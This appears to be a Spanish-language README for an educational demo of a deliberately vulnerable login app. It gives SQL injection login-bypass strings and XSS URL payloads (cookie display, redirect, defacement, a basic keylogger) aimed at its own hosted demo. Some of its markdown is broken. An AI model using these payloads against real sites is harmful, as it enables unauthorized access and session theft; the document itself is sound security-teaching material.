# 🔐 Sistema de Autenticación Web - Demo de Seguridad

[![Live Demo](https://img.shields.io/badge/Live-Demo-brightgreen)](https://auth-vulnerable.onrender.com)
[![GitHub](https://img.shields.io/github/stars/TU-USUARIO/auth-security-demo?style=social)](https://github.com/TU-USUARIO/auth-security-demo)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.13-blue.svg)](https://www.python.org/)

# Contenido 
# Advertencia legal
╔════════════════════════════════════════════════════════════╗
║                    SOLO PARA EDUCACIÓN                     ║
║                                                            ║
║  Estas técnicas SOLO deben usarse en:                     ║
║  ✓ Este proyecto de laboratorio                          ║
║  ✓ Entornos de prueba autorizados                        ║
║  ✓ Competencias CTF legítimas                            ║
║                                                            ║
║  ✗ NO usar en sistemas de producción                     ║
║  ✗ NO usar sin autorización explícita                    ║
║                                                            ║
║  El uso indebido es ILEGAL y puede resultar en:          ║
║  • Cargos criminales                                      ║
║  • Multas significativas                                  ║
║  • Prisión                                                ║
╚════════════════════════════════════════════════════════════╝
# Índice de Vulnerabilidades
  -SQL Injection (SQLi)
  -Almacenamiento Inseguro de Contraseñas
  -Cross-Site Scripting (XSS)
  - Insecure Direct Object Reference (IDOR)
  -Gestión Insegura de Sesiones
  - Missing Function Level Access Control
  - Security Misconfiguration
  -Sensitive Data Exposure
# 💉 VULNERABILIDAD #1: SQL INJECTION

## Descripción
Permite ejecutar código SQL arbitrario manipulando los parámetros de entrada, permitiendo bypass de autenticación, extracción de datos o modificación de la base de datos.

**Severidad:** 🔴 CRÍTICA (CVSS 9.8)  
**CWE:** CWE-89

---

## Paso a Paso MANUAL (Navegador)

### Paso 1: Ir al login vulnerable
```

### Paso 2: Probar Payload 1 (Más Efectivo)
|No.| usuario | contraseña| 
|---------|-----|-----------|
|1.| admin | x' OR '1'='1 |
|--------|------|--------|
|2.|  admin' OR 'a'='a   | x' OR 'a'='a| 
|3.  ' OR 1=1 --  | x  | Buenos Aires | ```
⚠️ **Importante:** Debe haber un espacio después de `--`
|--------|------|--------|

**Click en "Entrar"**
## Impacto de SQL Injection

✅ **Confirmado en este proyecto:**
- Bypass completo de autenticación
- Acceso a cuentas sin conocer contraseñas
- Exposición de errores SQL al usuario

⚠️ **Posible en aplicaciones reales:**
- Extracción de toda la base de datos
- Modificación de datos
- Eliminación de tablas
- Ejecución de comandos del sistema (en casos extremos)
```

# ⚡ VULNERABILIDAD #2: CROSS-SITE SCRIPTING (XSS)
## Descripción
Permite inyectar código JavaScript malicioso que se ejecuta en el navegador de la víctima, pudiendo robar cookies, sesiones o redirigir a sitios maliciosos.

**Severidad:** 🟠 ALTA (CVSS 7.5)  
**CWE:** CWE-79
### Comando 1: Verificar aplicación vulnerable está corriendo
### Paso 1: Hacer login en versión vulnerable
```
Usuario: admin
Contraseña: admin123

```
**Copia y pega esta URL completa en el navegador:**
https://auth-security-project.onrender.com/dashboard?message=<script>alert('XSS')</script>
---
✅ Aparece un **popup de alerta** con el mensaje "XSS Vulnerabilidad!"  
✅ Esto confirma que JavaScript arbitrario se está ejecutando

---

### Paso 2: Una vez en el dashboard, usar Payload XSS

### Payload 2: Robo de cookies (simulado)
```
https://auth-security-project.onrender.com/dashboard?message=<script>alert('Cookie: ' + document.cookie)</script>
```

### Payload 3: Usando eventos
```
https://auth-security-project.onrender.com/dashboard?message=<img src=x onerror="alert('XSS')">
```

### Payload 4: Redirección maliciosa
```
https://auth-security-project.onrender.com/dashboard?message=<script>window.location='http://malicioso.com'</script>
```

### Payload 5: Manipulación del DOM
```
https://auth-security-project.onrender.com/dashboard?message=<script>document.body.innerHTML='<h1>HACKED</h1>'</script>
```

### Payload 6: Keylogger básico
```
https://auth-security-project.onrender.com/dashboard?message=<script>document.onkeypress=function(e){alert('Tecla: '+e.key)}</script>
```

---

## Impacto de XSS

✅ **Confirmado:**
- Ejecución de JavaScript arbitrario
- Acceso a cookies de sesión
- Manipulación del contenido de la página

⚠️ **Posible en aplicaciones reales:**
- Robo de sesiones (session hijacking)
- Phishing mediante páginas falsas
- Keylogging
- Redireccionamiento a sitios maliciosos
- Desfiguración de sitios (defacement)

---
| Versión | URL | Propósito |
|---------|-----|-----------|
| 🔓 Vulnerable | [auth-vulnerable.onrender.com](https://auth-security-project.onrender.com) | Demostración de vulnerabilidades |
| 🔒 Segura | [auth-secure.onrender.com](https://auth-security-project-2.onrender.com)) | Implementación segura |

## 📸 Screenshots

![Demo](docs/screenshots/demo.gif)# auth-security-demo
